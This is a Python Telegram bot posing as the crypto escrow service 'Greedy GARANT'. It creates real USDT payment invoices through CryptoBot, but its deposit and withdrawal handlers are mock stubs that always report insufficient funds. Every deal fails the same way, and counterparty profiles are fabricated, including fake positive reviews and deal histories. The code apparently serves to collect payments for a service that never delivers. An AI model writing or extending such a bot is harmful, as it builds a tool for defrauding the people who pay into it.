import logging
import random
import secrets
import string
import os
from datetime import datetime, timedelta
from dotenv import load_dotenv
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler

from pyCryptoPayAPI import pyCryptoPayAPI

# Загружаем переменные из файла .env
load_dotenv()

# Читаем секретные данные из окружения
TOKEN = os.getenv("BOT_TOKEN")
CRYPTO_PAY_TOKEN = os.getenv("CRYPTO_PAY_TOKEN")
BOT_LINK = os.getenv("BOT_LINK")
STICKER_ID = os.getenv("STICKER_ID")

# Проверка, что все переменные загружены (опционально)
if not TOKEN or not CRYPTO_PAY_TOKEN:
    raise ValueError("❌ Не найдены BOT_TOKEN или CRYPTO_PAY_TOKEN в файле .env")

crypto = pyCryptoPayAPI(api_token=CRYPTO_PAY_TOKEN)

# Пути к изображениям
PROFILE_PIC = "profilegrd.jpg"
WALLET_PIC = "KoshelekGrd.jpg"
PAY_PIC = "PayGrd.jpg"
DEPOSIT_PIC = "depGrd.jpg"
PROJECTS_PIC = "proectsGrd.jpg"

user_messages = {}
user_crypto_amount_messages = {}
user_profile_prompt_messages = {}
user_deal_amount_messages = {}
user_profile_info_messages = {}
user_withdraw_amount_messages = {}
user_deposit_mock_messages = {}

MOCK_PROFILES = {
    "tragwork": {
        "user_id": 8727094296,
        "username": "@tragwork",
        "deals_count": 1,
        "buyer_deals_count": 1,
        "seller_deals_count": 0,
        "deposit": 0.0,
        "positive_reviews": 0,
        "negative_reviews": 0,
        "reg_date": "07.04.2026",
        "total_deals_usd": 2.65,
        "buyer_deals_usd": 2.65,
        "seller_deals_usd": 0.0,
        "balance": 0.0,
        "ref_balance": 0.0,
        "level": "🥉 Бронза",
        "ref_percent": 0.5
    },
    "8727094296": {
        "user_id": 8727094296,
        "username": "@tragwork",
        "deals_count": 1,
        "buyer_deals_count": 1,
        "seller_deals_count": 0,
        "deposit": 0.0,
        "positive_reviews": 0,
        "negative_reviews": 0,
        "reg_date": "07.04.2026",
        "total_deals_usd": 2.65,
        "buyer_deals_usd": 2.65,
        "seller_deals_usd": 0.0,
        "balance": 0.0,
        "ref_balance": 0.0,
        "level": "🥉 Бронза",
        "ref_percent": 0.5
    }
}

def generate_payment_id():
    return 'cmo' + ''.join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(22))

def generate_profile_from_input(user_input: str, for_deal: bool = False) -> dict:
    user_input = user_input.strip()

    if user_input.startswith("@"):
        username = user_input
        user_id = abs(hash(username)) % 10**10
    else:
        try:
            user_id = int(user_input)
        except ValueError:
            user_id = random.randint(1000000000, 9999999999)
        username = f"@user{user_id}"

    if for_deal:
        return {
            "user_id": user_id,
            "username": username,
            "deals_count": 7,
            "buyer_deals_count": 0,
            "seller_deals_count": 7,
            "deposit": 0.0,
            "positive_reviews": 5,
            "negative_reviews": 0,
            "reg_date": "10.11.2025",
            "total_deals_usd": 116.78,
            "buyer_deals_usd": 0.0,
            "seller_deals_usd": 116.78,
            "balance": 0.0,
            "ref_balance": 0.0,
            "level": "🥉 Бронза",
            "ref_percent": 0.5
        }

    if user_input in MOCK_PROFILES:
        return MOCK_PROFILES[user_input]

    deals_count = random.randint(0, 5)
    buyer_deals = random.randint(0, deals_count)
    seller_deals = deals_count - buyer_deals
    total_usd = round(random.uniform(0, 100), 2)
    buyer_usd = round(total_usd * random.uniform(0.3, 1.0), 2)
    seller_usd = round(total_usd - buyer_usd, 2)
    reg_days_ago = random.randint(1, 365)
    reg_date = (datetime.now() - timedelta(days=reg_days_ago)).strftime("%d.%m.%Y")

    return {
        "user_id": user_id,
        "username": username,
        "deals_count": deals_count,
        "buyer_deals_count": buyer_deals,
        "seller_deals_count": seller_deals,
        "deposit": 0.0,
        "positive_reviews": random.randint(0, 10),
        "negative_reviews": random.randint(0, 3),
        "reg_date": reg_date,
        "total_deals_usd": total_usd,
        "buyer_deals_usd": buyer_usd,
        "seller_deals_usd": seller_usd,
        "balance": 0.0,
        "ref_balance": 0.0,
        "level": "🥉 Бронза",
        "ref_percent": 0.5
    }

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_sticker(sticker=STICKER_ID)

    commands = [
        BotCommand("start_deal", "Начать Сделку"),
        BotCommand("deposit", "Депозит"),
        BotCommand("autopost", "Автопостинг"),
        BotCommand("profile", "Профиль"),
        BotCommand("info", "Информация"),
        BotCommand("projects", "Наши проекты"),
    ]
    await context.bot.set_my_commands(commands)

    reply_keyboard = [
        [KeyboardButton("Начать Сделку")],
        [KeyboardButton("Депозит"), KeyboardButton("Автопостинг")],
        [KeyboardButton("Профиль"), KeyboardButton("Информация")],
        [KeyboardButton("Наши проекты")]
    ]
    reply_markup = ReplyKeyboardMarkup(reply_keyboard, resize_keyboard=True)

    welcome_text = (
        "✋ Добро пожаловать в Greedy GARANT (7% комиссия).\n"
        "├ Наши проекты — @ProjectsGRD\n"
        "╰ Приятных покупок\n\n"
        "🔗 GREEDY-PROJECTS.COM — зеркало, чтобы не терять нас."
    )
    await update.message.reply_text(welcome_text, reply_markup=reply_markup)

    keyboard_inline = [[InlineKeyboardButton("Русский (RU)", callback_data="rule")]]
    reply_markup_inline = InlineKeyboardMarkup(keyboard_inline)
    await update.message.reply_text("Выберите язык:", reply_markup=reply_markup_inline)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    text = update.message.text

    command_mapping = {
        "/start_deal": "Начать Сделку",
        "/deposit": "Депозит",
        "/autopost": "Автопостинг",
        "/profile": "Профиль",
        "/info": "Информация",
        "/projects": "Наши проекты",
    }
    if text in command_mapping:
        text = command_mapping[text]

    # --- Ожидание ввода суммы для вывода (из депозита) ---
    if context.user_data.get('awaiting_withdraw_amount', False):
        if user_id in user_withdraw_amount_messages:
            try:
                await context.bot.delete_message(
                    chat_id=update.effective_chat.id,
                    message_id=user_withdraw_amount_messages[user_id]
                )
            except:
                pass
            del user_withdraw_amount_messages[user_id]
        context.user_data['awaiting_withdraw_amount'] = False

        keyboard = [[InlineKeyboardButton("Скрыть", callback_data="hide_insufficient_deal")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "❌ Недостаточно средств на депозите.",
            reply_markup=reply_markup
        )
        return

    # --- Ожидание ввода суммы для пополнения (заглушка из депозита) ---
    if context.user_data.get('awaiting_deposit_mock', False):
        if user_id in user_deposit_mock_messages:
            try:
                await context.bot.delete_message(
                    chat_id=update.effective_chat.id,
                    message_id=user_deposit_mock_messages[user_id]
                )
            except:
                pass
            del user_deposit_mock_messages[user_id]
        context.user_data['awaiting_deposit_mock'] = False

        keyboard = [[InlineKeyboardButton("Скрыть", callback_data="hide_insufficient_deal")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "❌ Недостаточно средств на кошельке.",
            reply_markup=reply_markup
        )
        return

    # --- Ожидание ввода суммы сделки ---
    if context.user_data.get('awaiting_deal_amount', False):
        if user_id in user_deal_amount_messages:
            try:
                await context.bot.delete_message(
                    chat_id=update.effective_chat.id,
                    message_id=user_deal_amount_messages[user_id]
                )
            except:
                pass
            del user_deal_amount_messages[user_id]
        context.user_data['awaiting_deal_amount'] = False

        try:
            amount = float(text)
            if amount <= 0:
                raise ValueError
        except:
            await update.message.reply_text("❌ Неверная сумма. Введите положительное число.")
            return

        context.user_data['deal_amount'] = amount

        keyboard = [
            [InlineKeyboardButton("Продавец", callback_data="role_seller"),
             InlineKeyboardButton("Покупатель", callback_data="role_buyer")],
            [InlineKeyboardButton("Отмена", callback_data="role_cancel")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await update.message.reply_text(
            "Кем вы будете выступать в этой сделке?",
            reply_markup=reply_markup
        )
        return

    # --- Ожидание ввода для профиля ---
    if context.user_data.get('awaiting_profile_input', False):
        if user_id in user_profile_prompt_messages:
            try:
                await context.bot.delete_message(
                    chat_id=update.effective_chat.id,
                    message_id=user_profile_prompt_messages[user_id]
                )
            except:
                pass
            del user_profile_prompt_messages[user_id]
        context.user_data['awaiting_profile_input'] = False

        for_deal = context.user_data.get('profile_for_deal', False)
        profile = generate_profile_from_input(text, for_deal=for_deal)

        msg = (
            f"❓ Информация\n"
            f"├ Никнейм: {profile['username']}\n"
            f"├ ID: {profile['user_id']}\n"
            f"╰ Кол-во сделок: {profile['deals_count']}\n\n"
            f"🎁 Реферальная программа\n"
            f"├ Уровень: {profile.get('level', '🥉 Бронза')}\n"
            f"├ Процент с пополнения: {profile.get('ref_percent', 0.5)}%\n"
            f"╰ Реферальный баланс: $ {profile.get('ref_balance', 0.0):,.2f}\n\n"
            f"⭐ Репутация\n"
            f"├ Депозит: $ {profile['deposit']:,.2f}\n"
            f"├ Отзывы (+ / -): {profile['positive_reviews']} / {profile['negative_reviews']}\n"
            f"╰ Дата регистрации: {profile['reg_date']}\n\n"
            f"📊 Статистика сделок\n"
            f"├ Сделки ({profile['deals_count']}): $ {profile['total_deals_usd']:,.2f}\n"
            f"├ Покупатель ({profile['buyer_deals_count']}): $ {profile['buyer_deals_usd']:,.2f}\n"
            f"╰ Продавец ({profile['seller_deals_count']}): $ {profile['seller_deals_usd']:,.2f}\n\n"
            f"❓ Финансы\n"
            f"├ Баланс: $ {profile.get('balance', 0.0):,.2f}\n"
            f"╰ Реферальный баланс: $ {profile.get('ref_balance', 0.0):,.2f}"
        )
        keyboard = [
            [InlineKeyboardButton("Нет отзывов", callback_data="no_reviews")],
            [InlineKeyboardButton("Начать сделку", callback_data="start_deal")],
            [InlineKeyboardButton("Скрыть", callback_data="hide_profile")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        message = await update.message.reply_text(msg, reply_markup=reply_markup)
        user_profile_info_messages[user_id] = message.message_id
        context.user_data['profile_for_deal'] = False
        return

    # --- Ожидание ввода суммы для крипто-пополнения ---
    if context.user_data.get('awaiting_crypto_amount', False):
        if user_id in user_crypto_amount_messages:
            try:
                await context.bot.delete_message(
                    chat_id=update.effective_chat.id,
                    message_id=user_crypto_amount_messages[user_id]
                )
            except:
                pass
            del user_crypto_amount_messages[user_id]
        context.user_data['awaiting_crypto_amount'] = False

        try:
            amount = float(text)
            if amount <= 0:
                amount = 5.0
        except:
            await update.message.reply_text("❌ Неверная сумма. Введите число.")
            return

        try:
            payment_id = generate_payment_id()
            fee = amount * 0.03
            total_with_fee = amount + fee

            invoice = crypto.create_invoice(
                asset="USDT",
                amount=total_with_fee,
                description=f"Оплата счёта {payment_id} (чистая сумма ${amount:.2f} + 3% комиссия)",
                paid_btn_name="openBot",
                paid_btn_url=BOT_LINK,
                expires_in=900
            )
            pay_url = invoice["bot_invoice_url"]
            keyboard = [[InlineKeyboardButton("Оплатить", url=pay_url)]]
            reply_markup = InlineKeyboardMarkup(keyboard)

            payment_message = (
                f"Счёт на оплату\n"
                f"├ Номер платежа: {payment_id}\n"
                f"├ Провайдер: 🤖 CryptoBot (Криптовалюта)\n"
                f"╰ Сумма к оплате: $ {total_with_fee:.2f} (+3.0%)\n\n"
                f"🕰 Счёт действителен 15 минут. После этого он будет автоматически отменён."
            )

            with open(PAY_PIC, 'rb') as photo:
                await update.message.reply_photo(
                    photo=photo,
                    caption=payment_message,
                    reply_markup=reply_markup
                )
        except Exception as e:
            print(f"ERROR: {e}")
            await update.message.reply_text(f"❌ Ошибка при создании счёта.")
        return

    # --- Обработка нажатий на Reply‑кнопки (и команд) ---
    if text == "Начать Сделку":
        keyboard = [[InlineKeyboardButton("Назад", callback_data="cancel_profile_input")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        search_msg = (
            "❓ Поиск пользователя для сделки. Вы можете найти пользователя по параметрам:\n"
            "├ ID: 6776313982\n"
            "├ Юзернейм: GreedyTG\n"
            "├ Юзернейм (полный): @GreedyTG\n"
            "╰ Юзернейм (ссылка): https://t.me/GreedyTG\n\n"
            "📖 Регистр не важен. При поиске нет разницы между UserName и username."
        )
        message = await update.message.reply_text(
            search_msg,
            reply_markup=reply_markup
        )
        user_profile_prompt_messages[user_id] = message.message_id
        context.user_data['awaiting_profile_input'] = True
        context.user_data['profile_for_deal'] = True

    elif text == "Депозит":
        deposit_text = (
            "Депозит — это ваш быстрый способ закрывать больше сделок. "
            "Один простой шаг, и покупатель перестаёт сомневаться: вы надёжный, "
            "вам можно доверять. Без лишних слов, без уговоров — просто факт, "
            "который работает на вас.\n\n"
            " Доп. информация\n"
            "╰ Как работает депозит? (https://teletype.in/@connectgrdbot/X8J4E4XxlLf)\n\n"
            " Ваш депозит: $ 0"
        )
        keyboard = [
            [InlineKeyboardButton("Пополнить", callback_data="deposit_mock"),
             InlineKeyboardButton("Вывести", callback_data="withdraw_mock")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        with open(DEPOSIT_PIC, 'rb') as photo:
            await update.message.reply_photo(
                photo=photo,
                caption=deposit_text,
                reply_markup=reply_markup
            )

    elif text == "Автопостинг":
        await update.message.reply_text("Автопостинг (в разработке)")

    elif text == "Профиль":
        keyboard = [
            [InlineKeyboardButton("Кошелек", callback_data="wallet")],
            [InlineKeyboardButton("Мои сделки", callback_data="deals")],
            [InlineKeyboardButton("Мои отзывы", callback_data="reviews")],
            [InlineKeyboardButton("Реферальная программа", callback_data="referral")],
            [InlineKeyboardButton("Анонимный режим", callback_data="anonymous")],
            [InlineKeyboardButton("Резервный аккаунт", callback_data="backup")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        with open(PROFILE_PIC, 'rb') as photo:
            await update.message.reply_photo(
                photo=photo,
                caption="👤 Профиль",
                reply_markup=reply_markup
            )

    elif text == "Информация":
        await update.message.reply_text("Информация о боте (в разработке)")

    elif text == "Наши проекты":
        with open(PROJECTS_PIC, 'rb') as photo:
            await update.message.reply_photo(
                photo=photo,
                caption="✨ Наши проекты - @ProjectsGRD"
            )

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    user_id = update.effective_user.id
    data = query.data

    await query.answer()

    if data == "deposit_mock":
        try:
            await query.message.delete()
        except:
            pass

        keyboard = [[InlineKeyboardButton("Отмена", callback_data="cancel_deposit_mock")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        message = await query.message.reply_text(
            "💰 Введите сумму пополнения:",
            reply_markup=reply_markup
        )
        user_deposit_mock_messages[user_id] = message.message_id
        context.user_data['awaiting_deposit_mock'] = True

    elif data == "cancel_deposit_mock":
        if user_id in user_deposit_mock_messages:
            try:
                await context.bot.delete_message(
                    chat_id=update.effective_chat.id,
                    message_id=user_deposit_mock_messages[user_id]
                )
            except:
                pass
            del user_deposit_mock_messages[user_id]
        context.user_data['awaiting_deposit_mock'] = False

    elif data == "withdraw_mock":
        try:
            await query.message.delete()
        except:
            pass

        keyboard = [[InlineKeyboardButton("Скрыть", callback_data="cancel_withdraw_mock")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        message = await query.message.reply_text(
            "💸 Введите сколько хотите вывести:",
            reply_markup=reply_markup
        )
        user_withdraw_amount_messages[user_id] = message.message_id
        context.user_data['awaiting_withdraw_amount'] = True

    elif data == "cancel_withdraw_mock":
        if user_id in user_withdraw_amount_messages:
            try:
                await context.bot.delete_message(
                    chat_id=update.effective_chat.id,
                    message_id=user_withdraw_amount_messages[user_id]
                )
            except:
                pass
            del user_withdraw_amount_messages[user_id]
        context.user_data['awaiting_withdraw_amount'] = False

    elif data == "hide_insufficient_deal":
        try:
            await query.message.delete()
        except:
            pass

    elif data == "no_reviews":
        await query.answer("Нет отзывов", show_alert=True)

    elif data == "start_deal":
        keyboard = [[InlineKeyboardButton("Отмена", callback_data="cancel_deal_amount")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        message = await query.message.reply_text(
            "💰 Введите сумму сделки:",
            reply_markup=reply_markup
        )
        user_deal_amount_messages[user_id] = message.message_id
        context.user_data['awaiting_deal_amount'] = True
        context.user_data['profile_msg_id'] = query.message.message_id

    elif data == "hide_profile":
        try:
            await query.message.delete()
        except:
            pass
        if user_id in user_profile_info_messages:
            del user_profile_info_messages[user_id]

    elif data == "cancel_profile_input":
        if user_id in user_profile_prompt_messages:
            try:
                await context.bot.delete_message(
                    chat_id=update.effective_chat.id,
                    message_id=user_profile_prompt_messages[user_id]
                )
            except:
                pass
            del user_profile_prompt_messages[user_id]
        context.user_data['awaiting_profile_input'] = False
        context.user_data['profile_for_deal'] = False
        await query.message.reply_text("❌ Ввод отменён.")

    elif data == "cancel_deal_amount":
        if user_id in user_deal_amount_messages:
            try:
                await context.bot.delete_message(
                    chat_id=update.effective_chat.id,
                    message_id=user_deal_amount_messages[user_id]
                )
            except:
                pass
            del user_deal_amount_messages[user_id]
        context.user_data['awaiting_deal_amount'] = False
        await query.message.reply_text("❌ Ввод суммы отменён.")

    elif data == "role_seller":
        await query.message.delete()
        keyboard = [[InlineKeyboardButton("Скрыть", callback_data="hide_insufficient_deal")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.message.reply_text(
            "⚠️ У покупателя недостаточно средств для начала сделки.",
            reply_markup=reply_markup
        )

    elif data == "role_buyer":
        await query.message.delete()
        keyboard = [[InlineKeyboardButton("Скрыть", callback_data="hide_insufficient_deal")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.message.reply_text(
            "⚠️ У вас недостаточно средств для начала сделки.",
            reply_markup=reply_markup
        )

    elif data == "role_cancel":
        await query.message.delete()

    elif data == "rule":
        pass

    elif data == "cancel":
        if user_id in user_messages:
            try:
                await context.bot.delete_message(
                    chat_id=update.effective_chat.id,
                    message_id=user_messages[user_id]
                )
            except:
                pass
            finally:
                if user_id in user_messages:
                    del user_messages[user_id]

    elif data == "wallet":
        await query.message.delete()
        keyboard = [
            [InlineKeyboardButton("Пополнить", callback_data="wallet_deposit"),
             InlineKeyboardButton("Вывести", callback_data="wallet_withdraw")],
            [InlineKeyboardButton("История пополнений", callback_data="history")],
            [InlineKeyboardButton("Назад", callback_data="back_to_profile")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        with open(WALLET_PIC, 'rb') as photo:
            await query.message.reply_photo(
                photo=photo,
                caption="💼 Финансы",
                reply_markup=reply_markup
            )

    elif data == "wallet_deposit":
        keyboard = [[InlineKeyboardButton("Отмена", callback_data="cancel_crypto")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        message = await query.message.reply_text(
            "💰 Введите сумму пополнения в USDT:",
            reply_markup=reply_markup
        )
        user_crypto_amount_messages[user_id] = message.message_id
        context.user_data['awaiting_crypto_amount'] = True

    elif data == "cancel_crypto":
        if user_id in user_crypto_amount_messages:
            try:
                await context.bot.delete_message(
                    chat_id=update.effective_chat.id,
                    message_id=user_crypto_amount_messages[user_id]
                )
            except:
                pass
            del user_crypto_amount_messages[user_id]
        context.user_data['awaiting_crypto_amount'] = False

    elif data == "back_to_profile":
        await query.message.delete()
        keyboard = [
            [InlineKeyboardButton("Кошелек", callback_data="wallet")],
            [InlineKeyboardButton("Мои сделки", callback_data="deals")],
            [InlineKeyboardButton("Мои отзывы", callback_data="reviews")],
            [InlineKeyboardButton("Реферальная программа", callback_data="referral")],
            [InlineKeyboardButton("Анонимный режим", callback_data="anonymous")],
            [InlineKeyboardButton("Резервный аккаунт", callback_data="backup")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        with open(PROFILE_PIC, 'rb') as photo:
            await query.message.reply_photo(
                photo=photo,
                caption="👤 Профиль",
                reply_markup=reply_markup
            )

    elif data in ["deals", "reviews", "referral", "anonymous", "backup", "history", "wallet_withdraw"]:
        await query.message.reply_text(f"{data} (в разработке)")

def main():
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler(["yulat1", "yulat2", "yulat3", "yulat4", "yulat5", "yulat6"], handle_message))
    app.add_handler(CommandHandler("start_deal", handle_message))
    app.add_handler(CommandHandler("deposit", handle_message))
    app.add_handler(CommandHandler("autopost", handle_message))
    app.add_handler(CommandHandler("profile", handle_message))
    app.add_handler(CommandHandler("info", handle_message))
    app.add_handler(CommandHandler("projects", handle_message))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(CallbackQueryHandler(handle_callback))

    print("🤖 Бот запущен!")
    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)

if __name__ == "__main__":
    main()